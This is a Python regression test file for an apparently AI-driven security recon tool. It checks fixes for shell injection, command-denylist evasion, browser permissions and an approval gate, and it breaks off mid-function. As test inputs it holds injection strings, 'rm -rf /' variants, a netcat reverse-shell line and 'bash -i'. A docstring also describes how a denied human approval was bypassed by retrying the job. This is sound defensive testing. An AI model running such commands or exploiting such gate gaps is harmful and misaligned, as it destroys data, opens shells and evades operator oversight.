"""Regression tests — pre-merge review of branch `agentic`.

Three defects confirmed by reading the code (not inferred from a type checker),
each encoded here together with the failure mode so a future regression is
visible rather than silent:

1. ``wth_ai/tools/pipeline.py`` ran its recon chains as a single
   ``subprocess.run(cmd, shell=True)`` string assembled with f-strings, so the
   target value was interpreted by /bin/sh. Now a real argv pipe.
2. ``wth_ai/browser/controller.py::browser_allowed()`` omitted
   ``PermissionMode.UNRESTRICTED``, making the MOST permissive mode the only
   one that could not drive the browser at all.
3. ``wth_ai/cli/ui/job_activity_bridge.py`` indexed ``event.job_id[:8]`` while
   ``Event.job_id`` is optional (``str | None``).
"""

from __future__ import annotations

import ast
import json
import os
from pathlib import Path

import pytest

os.environ.setdefault("WTH_SKIP_SETUP", "1")
os.environ.setdefault("WTH_TEST_MODE", "1")

from wth_ai.browser.controller import browser_allowed
from wth_ai.cli.ui.job_activity_bridge import unwire_job_activity, wire_job_activity
from wth_ai.cli.ui.tool_trace import ToolTracePanel
from wth_ai.config import UIConfig, WTHConfig
from wth_ai.events import Event
from wth_ai.models import PermissionMode
from wth_ai.policy.engine import evaluate_intent
from wth_ai.policy.profiles_builtin import PROFILES
from wth_ai.tools.pipeline import ToolChainOrchestrator, _safe_target

_REPO_ROOT = Path(__file__).resolve().parents[1]


# --------------------------------------------------------------------------- #
# 1. tools/pipeline.py — no shell, real OS pipe
# --------------------------------------------------------------------------- #
def test_pipeline_module_no_longer_uses_shell_true():
    """Source guard: no subprocess call in the module may pass shell=True.

    Parsed as AST rather than a substring check — the module's own docstring
    quotes the old pattern, and a naive ``"shell=True" not in src`` would read
    that prose as a live call site (and would equally miss nothing if the real
    call site were spelled across lines).
    """
    src = (_REPO_ROOT / "wth_ai" / "tools" / "pipeline.py").read_text(encoding="utf-8")
    offenders = [
        node.lineno
        for node in ast.walk(ast.parse(src))
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True
    ]
    assert not offenders, (
        f"wth_ai/tools/pipeline.py memakai shell=True di baris {offenders} — "
        "regresi review pre-merge"
    )


def test_pipeline_subprocess_calls_all_use_argv_lists():
    """The only subprocess.Popen in the module must get a list, never a string."""
    src = (_REPO_ROOT / "wth_ai" / "tools" / "pipeline.py").read_text(encoding="utf-8")
    offenders = []
    for node in ast.walk(ast.parse(src)):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        name = getattr(func, "attr", None) or getattr(func, "id", None)
        if name not in {"Popen", "run", "call", "check_output"}:
            continue
        if node.args and isinstance(node.args[0], ast.JoinedStr):
            offenders.append(node.lineno)
    assert not offenders, f"command dibangun sebagai f-string di baris {offenders}"


def test_run_pipeline_does_not_interpret_shell_metacharacters(tmp_path):
    """Behavioural proof of the fix.

    With the old shell=True string builder, `;` split the command in two and the
    marker file was created. As a plain argv element the whole string stays a
    single literal argument to ``echo``.
    """
    marker = tmp_path / "pwned_by_shell.txt"
    chains = ToolChainOrchestrator(timeout=10)
    stdout, _stderr, _code = chains._run_pipeline([["echo", f"hello; touch {marker}"]])
    assert not marker.exists(), "';' masih dieksekusi shell — shell=True aktif lagi"
    assert "hello; touch" in stdout


def test_run_pipeline_does_not_interpret_command_substitution(tmp_path):
    marker = tmp_path / "pwned_by_subst.txt"
    chains = ToolChainOrchestrator(timeout=10)
    stdout, _stderr, _code = chains._run_pipeline([["echo", f"$(touch {marker})"]])
    assert not marker.exists(), "command substitution $(...) masih dieval"
    assert "$(touch" in stdout


def test_run_pipeline_pipes_stage_stdout_into_next_stage():
    """Positive/compatibility: `a | b` semantics must survive the rewrite."""
    chains = ToolChainOrchestrator(timeout=10)
    stdout, _stderr, code = chains._run_pipeline([
        ["printf", "alpha\nbeta\ngamma\n"],
        ["grep", "beta"],
    ])
    assert code == 0
    assert stdout.strip() == "beta"


def test_run_pipeline_returns_only_last_stage_output():
    """Matches `printf ... | grep one | wc -l` — the shell printed only the tail."""
    chains = ToolChainOrchestrator(timeout=10)
    stdout, _stderr, _code = chains._run_pipeline([
        ["printf", "one\ntwo\n"],
        ["grep", "one"],
        ["wc", "-l"],
    ])
    assert stdout.strip() == "1"


def test_run_pipeline_timeout_is_enforced_and_reported():
    chains = ToolChainOrchestrator(timeout=1)
    _stdout, stderr, code = chains._run_pipeline([["sleep", "30"]])
    assert code == 124
    assert "timeout" in stderr


def test_safe_target_accepts_real_targets_and_rejects_payloads():
    for ok in (
        "example.com", "sub.example.com", "10.0.0.1", "host:8443",
        "https://x.io/path", "fe80::1",
    ):
        assert _safe_target(ok) == ok, f"{ok!r} seharusnya diterima"
    for bad in (
        "", "   ", "x.com; touch /tmp/x", "x.com|id", "x.com$(id)",
        "x.com && id", "x.com`id`", "a b", "x.com\nid",
    ):
        assert _safe_target(bad) is None, f"{bad!r} seharusnya ditolak"


def test_chains_refuse_hostile_target_before_running_any_tool():
    """The check runs before the registry lookup, so the verdict does not depend
    on which recon binaries happen to be installed on the machine."""
    chains = ToolChainOrchestrator(timeout=10)
    payload = "example.com; touch /tmp/wth_should_not_exist"
    for res in (
        chains.chain_subdomain_dns_http(payload),
        chains.chain_gau_sqli_candidates(payload),
        chains.chain_katana_params(payload),
    ):
        assert res.returncode == 1
        assert res.stderr == "invalid target"
        assert res.stdout == ""


# --------------------------------------------------------------------------- #
# 2. browser/controller.py — permission ladder must be monotonic
# --------------------------------------------------------------------------- #
def test_browser_allowed_covers_every_permissive_mode():
    assert browser_allowed(PermissionMode.STANDARD_TESTING) is True
    assert browser_allowed(PermissionMode.ELEVATED_APPROVAL) is True
    assert browser_allowed(PermissionMode.FULL_LAB) is True
    # Regression: leaving UNRESTRICTED out made the most permissive mode the
    # only one that could not browse.
    assert browser_allowed(PermissionMode.UNRESTRICTED) is True


def test_browser_still_denied_for_read_only_recon():
    """The fix must not open the browser for the read-only mode."""
    assert browser_allowed(PermissionMode.READ_ONLY_RECON) is False


# --------------------------------------------------------------------------- #
# 3. cli/ui/job_activity_bridge.py — optional job_id
# --------------------------------------------------------------------------- #
class _OrchStub:
    config = WTHConfig(ui=UIConfig(verbose=True, activity_mode="live"))
    _tool_trace = ToolTracePanel()
    _activity_stream = None


def test_job_activity_bridge_tolerates_event_without_job_id():
    """`Event.job_id` is optional (events.py). The handler used to do
    ``event.job_id[:8]``, so an id-less job event raised TypeError inside the
    subscriber — the bus isolates subscriber errors, so the UI just went quiet."""
    orch = _OrchStub()
    orch._tool_trace = ToolTracePanel()
    handler = wire_job_activity(orch)
    try:
        for etype, data in (
            ("job.started", {"type": "recon"}),
            ("job.completed", {}),
            ("job.progress", {"current": 10, "total": 100, "message": ""}),
            ("job.failed", {"reason": "boom"}),
        ):
            handler(Event(type=etype, data=data))  # must not raise
        assert any("started" in line for line in orch._tool_trace.log_lines)
    finally:
        unwire_job_activity(handler)


def test_job_activity_bridge_still_uses_real_job_id_when_present():
    orch = _OrchStub()
    orch._tool_trace = ToolTracePanel()
    handler = wire_job_activity(orch)
    try:
        handler(Event(type="job.started", job_id="abcdef123456", data={"type": "recon"}))
        assert any("abcdef12" in line for line in orch._tool_trace.log_lines)
    finally:
        unwire_job_activity(handler)


# --------------------------------------------------------------------------- #
# 4. policy/engine.py — whitespace + argv-aware safety rules
# --------------------------------------------------------------------------- #
_RO = PROFILES[PermissionMode.READ_ONLY_RECON]
_STD = PROFILES[PermissionMode.STANDARD_TESTING]
_UNR = PROFILES[PermissionMode.UNRESTRICTED]


def test_denylist_survives_whitespace_tricks():
    """`rm  -rf  /` was ALLOWED before the fix (pattern has single spaces)."""
    for cmd in ("rm -rf /", "rm  -rf  /", "rm   -rf   /"):
        d = evaluate_intent(command=cmd, profile=_UNR)
        assert d.allowed is False, f"{cmd!r} lolos denylist"


def test_rm_flag_reorder_and_long_flags_are_denied():
    """`rm -fr /` and `--no-preserve-root` contain neither denylist literal."""
    for cmd in (
        "rm -fr /",
        "rm -rf --no-preserve-root /",
        "rm -r -f /",
        "rm --recursive --force /",
        "rm -rf /*",
    ):
        d = evaluate_intent(command=cmd, profile=_UNR)
        assert d.allowed is False, f"{cmd!r} lolos (argv safety rule tidak jalan)"


def test_rm_of_subdirectory_is_not_denied_by_the_argv_rule():
    """The new rule is about the root itself, not a blanket rm ban.

    (`rm -rf /tmp/x` is still conservatively caught by the pre-existing
    substring denylist -- unchanged behaviour, deliberately not widened here.)
    """
    from wth_ai.policy.engine import argv_safety_match

    assert argv_safety_match("rm -rf /tmp/scratch") is None
    assert argv_safety_match("rm -rf") is None
    assert argv_safety_match("rm -rf /") == ("rm recursive+force on the filesystem root", True)


def test_high_risk_patterns_survive_tab_and_double_space():
    """Patterns carry a literal trailing space (`hydra `), which a TAB evaded."""
    for cmd in ("hydra -l x -P y host", "hydra\t-l x -P y host", "hydra  -l x -P y host"):
        d = evaluate_intent(command=cmd, profile=_UNR)
        assert d.allowed is False and d.approval_needed is True, f"{cmd!r} tidak minta approval"
    for cmd in ("nc -e /bin/sh h 4444", "nc\t-e /bin/sh h 4444"):
        d = evaluate_intent(command=cmd, profile=_UNR)
        assert d.allowed is False and d.approval_needed is True, f"{cmd!r} tidak minta approval"


def test_find_exec_requires_approval_while_plain_find_stays_auto():
    """`find` is granted as read-only, but -exec runs an arbitrary program --
    exactly what the interpreter capability exists to gate."""
    plain = evaluate_intent(command="find /tmp -maxdepth 0", profile=_RO)
    assert plain.allowed is True and plain.approval_needed is False

    gated = evaluate_intent(command="find /tmp -maxdepth 0 -exec python3 -c pass ;", profile=_RO)
    assert gated.allowed is False and gated.approval_needed is True
    assert "find" in gated.reason

    approved = evaluate_intent(
        command="find /tmp -maxdepth 0 -exec python3 -c pass ;", profile=_RO, approved=True,
    )
    assert approved.allowed is True, "operator tidak bisa meng-approve find -exec"


def test_passive_recon_lookups_are_granted_in_read_only_mode():
    """dig/host/nslookup/whois were granted in NO mode except UNRESTRICTED's
    wildcard, forcing operators out of read-only recon to resolve a hostname."""
    for tool in ("dig", "host", "nslookup", "whois", "getent"):
        for profile, label in ((_RO, "read_only"), (_STD, "standard")):
            assert profile.resolve(tool) is not None, f"{tool} blocked in {label}"


def test_active_light_scanners_are_reachable_from_standard():
    """nikto/naabu were absent from every set -- unreachable outside UNRESTRICTED."""
    for tool in ("nikto", "naabu"):
        assert _RO.resolve(tool) is None, f"{tool} seharusnya belum boleh di read_only"
        assert _STD.resolve(tool) is not None, f"{tool} seharusnya boleh dari standard"


def test_interpreter_gate_still_binds_everywhere():
    """The new rules must not have opened the interpreter gate (ADR-009)."""
    for profile in (_RO, _STD, _UNR):
        for cmd in ("python3 -c pass", "bash -i", "/bin/bash -i"):
            d = evaluate_intent(command=cmd, profile=profile)
            assert d.allowed is False and d.approval_needed is True, f"{cmd!r} di {profile.name}"


# --------------------------------------------------------------------------- #
# 5. brain/chain_planner.py — string steps (rules.yaml shape)
# --------------------------------------------------------------------------- #
def test_chain_planner_accepts_string_steps():
    """rules.yaml writes `chain: [a, b, c]` (strings); CHAIN_TEMPLATES uses
    dicts. The string form used to die on `steps[-1].get('proof')`."""
    from wth_ai.brain.chain_planner import ChainPlanner

    hyps = [{
        "vuln_class": "idor",
        "title": "idor chain",
        "component": "https://t.example/api/users?id=1",
        "chain_steps": ["baseline_user_a", "swap_id_user_b", "diff_response"],
    }]
    planner = ChainPlanner()
    chains = planner.plan_from_hypotheses(hyps, "https://t.example")
    assert len(chains) == 1
    assert chains[0].evidence_schema["proof"] == "diff_response"
    tasks = planner.chains_to_tasks(chains)
    assert tasks and tasks[0].command_plan[0]["command"]


def test_chain_planner_handles_every_chain_in_the_shipped_rules_yaml():
    """Exercises the real shipped data -- the actual regression source."""
    import yaml

    import wth_ai
    from wth_ai.brain.chain_planner import ChainPlanner

    rules_path = Path(wth_ai.__file__).resolve().parent / "brain" / "rules.yaml"
    rules = yaml.safe_load(rules_path.read_text(encoding="utf-8")).get("rules", [])
    hyps = [
        {
            "vuln_class": str(r.get("id", "x")),
            "title": str(r.get("id", "x")),
            "component": "https://t.example/p?id=1",
            "chain_steps": r.get("chain"),
        }
        for r in rules
    ]
    assert hyps, "rules.yaml kosong -- test tidak bermakna"
    planner = ChainPlanner()
    chains = planner.plan_from_hypotheses(hyps, "https://t.example")  # must not raise
    assert chains
    assert planner.chains_to_tasks(chains)  # must not raise either


# --------------------------------------------------------------------------- #
# 6. orchestrator — verified-finding label
# --------------------------------------------------------------------------- #
def test_finding_learning_label_never_raises_on_empty_title():
    """`finding.cwe or finding.title.split()[0]` raised IndexError for a
    finding whose title was empty, aborting the whole /verify run."""
    from wth_ai.orchestrator import _finding_learning_label

    class _F:
        def __init__(self, cwe: str, title: str) -> None:
            self.cwe, self.title = cwe, title

    assert _finding_learning_label(_F("", "")) == "unnamed"
    assert _finding_learning_label(_F("", "   ")) == "unnamed"
    assert _finding_learning_label(_F("CWE-639", "")) == "CWE-639"
    assert _finding_learning_label(_F("", "IDOR on /api/users")) == "idor"
    assert _finding_learning_label(_F("", "  XSS reflected  ")) == "xss"


# --------------------------------------------------------------------------- #
# 7. recon data-loss fixes
# --------------------------------------------------------------------------- #
def test_recon_bridge_fallback_reads_the_actual_normalized_filenames(tmp_path):
    """The fallback loader guessed `<bucket>.json`, but the writer emits
    crawl_urls.json / alive_urls.json / fingerprint.json -- so URLs, probes and
    technologies were silently dropped whenever normalized_result.json was
    missing."""
    from wth_ai.graph.asset_graph import AssetGraph
    from wth_ai.graph.recon_bridge import sync_recon_to_graph
    from wth_ai.recon.normalizer import ReconNormalizer

    norm = ReconNormalizer()
    norm.add_item("t", {"kind": "url", "url": "https://a.example/x"})
    norm.add_item("t", {"kind": "http_probe", "url": "https://a.example/x", "status": 200})
    norm.add_item("t", {"kind": "fingerprint", "host": "a.example", "technology": "nginx", "version": "1.25"})
    norm.write_normalized(tmp_path / "normalized")
    assert not (tmp_path / "normalized_result.json").exists()  # forces the fallback

    result = sync_recon_to_graph(tmp_path, AssetGraph("premerge-test"), target="a.example")
    assert result["synced"] is True
    summary = result["summary"]
    assert summary["urls"] == 1, "URL hilang di jalur fallback"
    assert summary["http_probes"] == 1, "HTTP probe hilang di jalur fallback"
    assert summary["fingerprints"] == 1, "fingerprint hilang di jalur fallback"


def test_tech_stack_loader_reads_normalized_fingerprint_file(tmp_path):
    """Previously read `summary['fingerprints']`, which does not exist (the
    count lives at `summary['assets']['fingerprints']`) -- so tech_stack was
    always {}."""
    from wth_ai.jobs.handlers import _load_fingerprint_tech_stack

    norm_dir = tmp_path / "normalized"
    norm_dir.mkdir()
    (norm_dir / "fingerprint.json").write_text(
        json.dumps([
            {"host": "a.example", "technology": "nginx", "version": "1.25"},
            {"host": "a.example", "technology": "React", "version": ""},
            {"host": "a.example", "technology": "", "version": "1.0"},
        ]),
        encoding="utf-8",
    )
    assert _load_fingerprint_tech_stack(tmp_path) == {"nginx": "1.25", "React": ""}
    assert _load_fingerprint_tech_stack(tmp_path / "missing") == {}


def test_recon_diff_detects_same_finding_title_on_a_different_asset():
    """Findings were diffed by title alone, so the same title on another host
    looked unchanged."""
    from wth_ai.recon.diff import diff_results

    old = {"findings": [{"category": "service", "asset": "a.example", "title": "Open port 8080"}]}
    new = {"findings": [
        {"category": "service", "asset": "a.example", "title": "Open port 8080"},
        {"category": "service", "asset": "b.example", "title": "Open port 8080"},
    ]}
    changes = diff_results(old, new)
    assert changes["new_ports"] == ["Open port 8080"]
    assert changes["changed"] is True


def test_recon_diff_still_reports_no_change_for_an_identical_finding():
    from wth_ai.recon.diff import diff_results

    same = {"findings": [{"category": "service", "asset": "a.example", "title": "Open port 8080"}]}
    changes = diff_results(same, {"findings": list(same["findings"])})
    assert changes["total_changes"] == 0


def test_every_external_adapter_key_exists_in_the_catalog():
    """`LinkFinder` (catalog) vs `linkfinder` (adapter) meant the adapter was
    unreachable: get_adapter() returned None and the tool was always skipped."""
    from wth_ai.recon.registry import ReconToolRegistry
    from wth_ai.recon.tools.adapters import ADAPTERS

    registry = ReconToolRegistry()
    orphans = sorted(set(ADAPTERS) - set(registry.tools))
    assert not orphans, f"nama adapter tidak ada di katalog (tak pernah kepakai): {orphans}"


def test_every_supported_external_tool_resolves_to_an_adapter():
    from wth_ai.recon.registry import ReconToolRegistry
    from wth_ai.recon.tools.adapters import get_adapter
    from wth_ai.recon.tools.catalog import SUPPORTED_EXTERNAL

    registry = ReconToolRegistry()
    unresolved = sorted(
        name for name in SUPPORTED_EXTERNAL
        if name in registry.tools and get_adapter(name) is None
    )
    assert not unresolved, f"tool diklaim didukung tapi tak punya adapter: {unresolved}"


# --------------------------------------------------------------------------- #
# 8. jobs/worker.py — approval gate is status-based
# --------------------------------------------------------------------------- #
def _approval_rig(tmp_path, monkeypatch):
    """JobManager + WorkerEngine on an isolated WTH_HOME with a counting handler."""
    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    from wth_ai.jobs.manager import JobManager
    from wth_ai.jobs.worker import WorkerEngine

    executed: list[str] = []

    def _handler(job, ctx):
        executed.append(job.job_id)
        ctx.log("handler ran")
        return {"type": "custom", "status": "completed"}

    manager = JobManager()
    worker = WorkerEngine(manager, handlers={"custom": _handler})
    return manager, worker, executed


def test_denied_approval_is_not_bypassable_by_job_retry(tmp_path, monkeypatch):
    """Review pre-merge (T-1, KRITIS): the gate tested for the PRESENCE of an
    approval_id, not its status. `_resume_waiting()` fails a job on DENY without
    clearing that id, so `retry_job` (which accepts failed jobs) put it back in
    the queue, the gate was skipped, and the handler ran with approval DENIED."""
    manager, worker, executed = _approval_rig(tmp_path, monkeypatch)

    job = manager.create_job("custom", created_by="test", requires_approval=True)
    created = manager.get_job(job.job_id)
    assert created is not None and created.status != "failed"

    assert worker.run_once()["status"] == "waiting_approval"
    parked = manager.get_job(job.job_id)
    assert parked is not None
    approval_id = (parked.metadata or {}).get("approval_id")
    assert approval_id, "job diparkir tanpa membuat approval"

    manager.approvals.deny(approval_id)
    worker.run_once()
    denied = manager.get_job(job.job_id)
    assert denied is not None and denied.status == "failed"
    assert executed == [], "handler jalan padahal approval baru DENIED"

    manager.retry_job(job.job_id)
    worker.run_once()
    assert executed == [], "handler jalan setelah retry meski approval DENIED"
    still = manager.get_job(job.job_id)
    assert still is not None and still.status == "failed"


def test_approved_job_still_runs(tmp_path, monkeypatch):
    """Compatibility: the happy path must keep working."""
    manager, worker, executed = _approval_rig(tmp_path, monkeypatch)

    job = manager.create_job("custom", created_by="test", requires_approval=True)
    assert worker.run_once()["status"] == "waiting_approval"
    parked = manager.get_job(job.job_id)
    assert parked is not None
    approval_id = (parked.metadata or {}).get("approval_id")
    assert approval_id
    manager.approvals.approve(approval_id)

    result = worker.run_once()
    assert result["status"] == "completed"
    assert executed == [job.job_id]


def test_missing_approval_record_fails_closed_instead_of_stalling(tmp_path, monkeypatch):
    """Review pre-merge (M-1): with approvals.json gone the job used to sit in
    waiting_approval forever -- `_resume_waiting()` saw record None and took no
    action, `run_once()` never re-picks a job that is not `queued`, and
    `retry_job()` refuses any status outside failed/stopped/cancelled. It now
    fails closed, which makes a retry able to re-request."""
    manager, worker, executed = _approval_rig(tmp_path, monkeypatch)

    job = manager.create_job("custom", created_by="test", requires_approval=True)
    first = worker.run_once()
    assert first["status"] == "waiting_approval"

    manager.approvals.path.unlink()  # simulate the approval store being lost
    assert worker.run_once()["status"] == "idle"

    parked = manager.get_job(job.job_id)
    assert parked is not None
    assert parked.status == "failed", "job nyangkut permanen, bukan fail-closed"
    assert executed == []

    # Recoverable: retry re-enters the approval gate and asks for a fresh approval.
    manager.retry_job(job.job_id)
    again = worker.run_once()
    assert again["status"] == "waiting_approval"
    assert again["approval_id"] != first["approval_id"], "harus request approval baru"
    assert executed == []


def test_job_requiring_approval_never_executes_while_pending(tmp_path, monkeypatch):
    manager, worker, executed = _approval_rig(tmp_path, monkeypatch)

    job = manager.create_job("custom", created_by="test", requires_approval=True)
    assert worker.run_once()["status"] == "waiting_approval"
    # A parked job is no longer `queued`, so further ticks must not pick it up.
    for _ in range(3):
        assert worker.run_once()["status"] == "idle"
    assert executed == []
    parked = manager.get_job(job.job_id)
    assert parked is not None and parked.status == "waiting_approval"


# --------------------------------------------------------------------------- #
# 9. permission_set tool — schema enum vs real PermissionMode values
# --------------------------------------------------------------------------- #
def _permission_set_enum() -> list[str]:
    from wth_ai.agents.tool_registry import TOOL_DEFINITIONS

    return TOOL_DEFINITIONS["permission_set"]["function"]["parameters"]["properties"]["mode"]["enum"]


def test_permission_set_schema_only_advertises_real_modes():
    """The schema listed `read_only_recon` / `standard_testing` /
    `elevated_testing`, none of which are PermissionMode values -- so the model
    could only ever successfully set `full_lab`."""
    real = {p.value for p in PermissionMode}
    advertised = set(_permission_set_enum())
    assert advertised <= real, f"schema mengiklankan mode yang tidak ada: {sorted(advertised - real)}"
    assert "read_only" in advertised and "standard" in advertised


def test_every_advertised_permission_mode_actually_applies():
    from wth_ai.permission_manager import PermissionManager

    for value in _permission_set_enum():
        assert PermissionManager().set_mode(value).value == value


def test_legacy_permission_mode_spellings_still_resolve():
    """A stored session or a model echoing the old spelling must not error."""
    from wth_ai.permission_manager import PermissionManager

    for legacy, expected in (
        ("read_only_recon", "read_only"),
        ("standard_testing", "standard"),
        ("elevated_testing", "elevated"),
        ("active_test", "elevated"),
    ):
        assert PermissionManager().set_mode(legacy).value == expected


# --------------------------------------------------------------------------- #
# 10. planner — the budget profile invariant, asserted non-tautologically
# --------------------------------------------------------------------------- #
def test_planner_never_exceeds_its_profile_cap_and_budget_stays_safe():
    """`budget` promises builtin + a few SAFE passive tools.

    Written as a direct assertion over every selected tool rather than an
    `all(...) or len(...) <= cap` disjunction, where the fallback clause makes
    the whole check pass whenever the plan happens to be within the cap.
    """
    from wth_ai.recon.planner import PROFILE_CAP, ReconPlanner
    from wth_ai.recon.registry import ReconToolRegistry

    registry = ReconToolRegistry()
    planner = ReconPlanner(registry)
    for profile in ("budget", "recon-only", "default", "high-quality"):
        plan = planner.plan("example.com", profile=profile)
        assert plan.selected, profile
        assert len(plan.selected) <= PROFILE_CAP[profile], profile
        for chosen in plan.selected:
            spec = registry.get(chosen.tool)
            assert spec is not None, chosen.tool
            assert spec.execution_mode != "manual" and spec.execution_mode != "stub"
            if profile == "budget":
                assert spec.risk_level == "safe", (
                    f"{chosen.tool} (risk={spec.risk_level}) bocor ke profile budget"
                )
                assert spec.enabled_by_default, f"{chosen.tool} disabled tapi lolos ke budget"


# --------------------------------------------------------------------------- #
# 11. tool_runs.jsonl — one schema for every producer
# --------------------------------------------------------------------------- #
def test_tool_runs_jsonl_entries_all_share_one_schema(tmp_path, monkeypatch):
    """The engine's builtin-fingerprint step wrote its own reduced object
    (`{tool, status, items}`), so a single line of tool_runs.jsonl had a
    different shape from every other line."""
    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    from wth_ai.recon.engine import ReconEngine

    engine = ReconEngine(results_root=tmp_path / "runs", tool_timeout=5)
    engine.run("example.com", profile="budget", job_id="JOB-schema", authorized=True)

    raw = (tmp_path / "runs" / "JOB-schema" / "tool_runs.jsonl").read_text(encoding="utf-8")
    entries = [json.loads(line) for line in raw.splitlines() if line.strip()]
    assert entries, "tool_runs.jsonl kosong"
    schemas = {frozenset(entry) for entry in entries}
    assert len(schemas) == 1, f"skema baris runlog tidak seragam: {sorted(schemas)}"
    assert schemas.pop() == frozenset({
        "tool", "status", "started_at", "finished_at",
        "duration_ms", "output_path", "error", "items",
    })


# --------------------------------------------------------------------------- #
# 12. LLM provider errors — the API's own explanation must survive
# --------------------------------------------------------------------------- #
_OPENROUTER_429 = {
    "error": {
        "message": "Provider returned error",
        "code": 429,
        "metadata": {
            "raw": (
                "stub-model:free is temporarily rate-limited upstream. Please retry "
                "shortly, or add your own key to accumulate your rate limits"
            ),
            "limit_source": "upstream_provider_shared_pool",
            "remedy_hint": "Retry shortly or route to another provider",
        },
    }
}


def test_http_error_message_keeps_the_providers_remedy():
    """Live OpenRouter 429s carry the fix in the body. The old 429 branch
    replaced that body with "rate limit (HTTP 429). Tunggu sebentar", and
    `openrouter.py` used bare `raise_for_status()`, which dropped it entirely --
    the operator saw only "429 Client Error: Too Many Requests"."""
    from wth_ai.llm.providers.base import http_error_message

    msg = http_error_message(
        "openrouter", "stub-model:free", "https://openrouter.ai/api/v1/chat/completions",
        429, json.dumps(_OPENROUTER_429),
    )
    assert "rate limit (HTTP 429)" in msg
    assert "rate-limited upstream" in msg
    assert "add your own key" in msg


def test_http_error_message_handles_non_json_body():
    from wth_ai.llm.providers.base import http_error_message

    msg = http_error_message("openai", "gpt-x", "https://api.openai.com/v1/chat/completions",
                             502, "<html>Bad gateway</html>")
    assert "Bad gateway" in msg


def test_http_error_message_redacts_secrets_in_body():
    """Error bodies are embedded in messages that get logged, so a credential
    echoed back by a provider must not travel with them."""
    from wth_ai.llm.providers.base import http_error_message

    body = json.dumps({"error": {"message": "bad key token=SUPERSECRETVALUE1234567890"}})
    msg = http_error_message("openrouter", "m", "https://x", 401, body)
    assert "SUPERSECRETVALUE1234567890" not in msg
    assert "REDACTED" in msg


def test_raise_for_status_uses_the_name_property():
    """`provider_name` exists only on OpenAICompatProvider; reading it in the
    error path of OpenRouter/Ollama raised AttributeError instead of LLMError."""
    import requests

    from wth_ai.llm.errors import LLMError
    from wth_ai.llm.providers.base import raise_for_status
    from wth_ai.llm.providers.ollama import OllamaProvider

    provider = OllamaProvider()
    resp = requests.Response()
    resp.status_code = 404
    resp.url = "http://127.0.0.1:11434/api/chat"
    resp._content = b'{"error":"no such endpoint"}'
    with pytest.raises(LLMError) as excinfo:
        raise_for_status(provider.name, "stub-model", resp.url, resp)
    assert "ollama" in str(excinfo.value)


def test_openrouter_error_path_raises_llmerror_not_attributeerror(monkeypatch):
    from wth_ai.llm.errors import LLMError
    import wth_ai.llm.providers.openrouter as mod

    class _Resp:
        ok = False
        status_code = 429
        url = "https://openrouter.ai/api/v1/chat/completions"
        text = json.dumps(_OPENROUTER_429)

    class _StubRequests:
        @staticmethod
        def post(*args, **kwargs):
            return _Resp()

    monkeypatch.setattr(mod, "requests", _StubRequests())
    provider = mod.OpenRouterProvider(api_key="dummy")
    with pytest.raises(LLMError) as excinfo:
        provider.chat("stub-model:free", [{"role": "user", "content": "hi"}], timeout=5)
    assert "rate-limited upstream" in str(excinfo.value)


def test_router_failure_reports_every_provider_not_just_the_last():
    """`chat_for_role` raised only `last_err`, so the tail of failover_order
    (a dead local ollama) hid the actionable failure at the head."""
    from wth_ai.llm.errors import LLMError
    from wth_ai.llm.router import LLMProviderRouter

    cfg = WTHConfig.load()
    router = LLMProviderRouter(cfg)

    class _Boom:
        provider_type = "stub"

        def available(self) -> bool:
            return True

        def chat(self, model, messages, **kwargs):
            raise LLMError(f"boom from {model}")

        def chat_with_fallback(self, primary, backup, messages, **kwargs):
            raise LLMError("stub: HTTP 400 — model 'Hacker' tidak valid")

    router._providers = {}
    original = router._get_or_create_provider

    def _fake(ptype):
        return _Boom()

    router._get_or_create_provider = _fake  # type: ignore[method-assign]
    try:
        with pytest.raises(LLMError) as excinfo:
            router.chat_for_role("planner", [{"role": "user", "content": "hi"}], timeout=5)
        message = str(excinfo.value)
        assert "tidak valid" in message
        assert router.last_failures, "rincian per-provider tidak dicatat"
    finally:
        router._get_or_create_provider = original  # type: ignore[method-assign]

def test_chat_with_fallback_reports_both_models():
    """`chat_with_fallback` raised only the BACKUP's error, so when both models
    were rate-limited the operator saw just one model named and no sign the
    fallback had even been attempted (verified live against two :free models)."""
    from wth_ai.llm.errors import LLMError
    from wth_ai.llm.providers.base import BaseLLMProvider

    class _BothFail(BaseLLMProvider):
        provider_type = "stub"

        def available(self) -> bool:
            return True

        def list_models(self) -> list[str]:
            return []

        def chat(self, model, messages, **kwargs):
            raise LLMError(f"429 for {model}")

    with pytest.raises(LLMError) as excinfo:
        _BothFail().chat_with_fallback("primary-model", "backup-model", [{"role": "user", "content": "hi"}])

    message = str(excinfo.value)
    assert "primary-model" in message and "backup-model" in message
    assert "429 for primary-model" in message
    assert "429 for backup-model" in message


def test_chat_with_fallback_returns_backup_when_only_primary_fails():
    from wth_ai.llm.errors import LLMError
    from wth_ai.llm.providers.base import BaseLLMProvider

    class _PrimaryFails(BaseLLMProvider):
        provider_type = "stub"

        def available(self) -> bool:
            return True

        def list_models(self) -> list[str]:
            return []

        def chat(self, model, messages, **kwargs):
            if model == "primary-model":
                raise LLMError("429 for primary-model")
            return "answered by backup"

    text, used = _PrimaryFails().chat_with_fallback(
        "primary-model", "backup-model", [{"role": "user", "content": "hi"}]
    )
    assert text == "answered by backup"
    assert used == "backup-model"

# --------------------------------------------------------------------------- #
# 13. Custom OpenAI-compatible provider (setup wizard + keyless endpoints)
# --------------------------------------------------------------------------- #
def test_custom_provider_is_available_without_an_api_key():
    """A self-hosted OpenAI-compatible endpoint usually runs without auth.
    Requiring a key made `available()` False, so setup's smoke test and every
    chat refused to touch an endpoint that was reachable."""
    from wth_ai.llm.providers.openai_compat import OpenAICompatProvider

    custom = OpenAICompatProvider(
        provider_name="custom", api_key=None, base_url="http://127.0.0.1:20128/v1"
    )
    assert custom.available()

    gateway = OpenAICompatProvider(provider_name="9router", api_key=None)
    assert gateway.available()

    # Hosted providers must still require a key.
    for hosted in ("openai", "anthropic", "google", "groq"):
        assert not OpenAICompatProvider(provider_name=hosted, api_key=None).available()


def test_keyless_provider_sends_no_authorization_header():
    from wth_ai.llm.providers.openai_compat import OpenAICompatProvider

    assert "Authorization" not in OpenAICompatProvider(provider_name="custom", api_key=None)._headers()
    with_key = OpenAICompatProvider(provider_name="custom", api_key="sk-x")._headers()
    assert with_key["Authorization"] == "Bearer sk-x"


def test_non_interactive_setup_configures_a_custom_endpoint(tmp_path, monkeypatch):
